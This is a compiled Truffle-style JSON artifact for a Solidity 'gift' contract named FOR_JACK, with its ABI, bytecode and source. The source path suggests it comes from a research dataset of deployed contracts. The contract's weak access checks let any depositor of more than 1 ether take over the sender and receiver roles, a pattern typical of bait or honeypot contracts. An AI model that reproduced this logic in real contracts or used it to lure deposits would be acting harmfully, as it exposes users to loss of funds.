{
  "contractName": "FOR_JACK",
  "abi": [
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_reciver",
          "type": "address"
        }
      ],
      "name": "PutGift",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_unixTime",
          "type": "uint256"
        }
      ],
      "name": "SetGiftTime",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "GetGift",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "CloseGift",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x60806040526000600160146101000a81548160ff02191690831515021790555034801561002b57600080fd5b506103e68061003b6000396000f300608060405260043610610062576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063108d40f8146100645780633f7e21201461009a578063bea948c8146100b1578063dac47a71146100bb575b005b610098600480360381019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506100e8565b005b3480156100a657600080fd5b506100af6101df565b005b6100b9610296565b005b3480156100c757600080fd5b506100e66004803603810190808035906020019092919050505061035a565b005b600160149054906101000a900460ff1615801561010c5750670de0b6b3a764000034115b8061014e575060008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16145b156101dc57336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555080600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550426002819055505b50565b3373ffffffffffffffffffffffffffffffffffffffff166000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1614801561027457506000600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1614155b156102945760018060146101000a81548160ff0219169083151502179055505b565b3373ffffffffffffffffffffffffffffffffffffffff16600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff161480156102f4575060025442115b15610358573373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f19350505050158015610356573d6000803e3d6000fd5b505b565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614156103b757806002819055505b505600a165627a7a72305820eb8d809acc15afbd5aee421c9f7291181f1599c3b95aabeb69c001644b38bd9e0029",
  "source": "\n\ncontract FOR_JACK\n{\n    address sender;\n    \n    address reciver;\n    \n    bool closed = false;\n    \n    uint unlockTime;\n \n    function PutGift(address _reciver)\n    public\n    payable\n    {\n        if( (!closed&&(msg.value > 1 ether)) || sender==0x00 )\n        {\n            sender = msg.sender;\n            reciver = _reciver;\n            unlockTime = now;\n        }\n    }\n    \n    function SetGiftTime(uint _unixTime)\n    public\n    {\n        if(msg.sender==sender)\n        {\n            unlockTime = _unixTime;\n        }\n    }\n    \n    function GetGift()\n    public\n    payable\n    {\n        if(reciver==msg.sender&&now>unlockTime)\n        {\n            msg.sender.transfer(this.balance);\n        }\n    }\n    \n    function CloseGift()\n    public\n    {\n        if(sender == msg.sender && reciver != 0x0 )\n        {\n           closed=true;\n        }\n    }\n    \n    function() public payable{}\n}",
  "sourcePath": "/home/XXX-1/smartrim-experiment/for-rlf/0x265c91539255a96e1005a0fd11ca776c183d04f5/contracts/0x265c91539255a96e1005a0fd11ca776c183d04f5.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.25+commit.59dbf8f1.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2025-08-14T03:49:49.081Z",
  "networkType": "ethereum",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}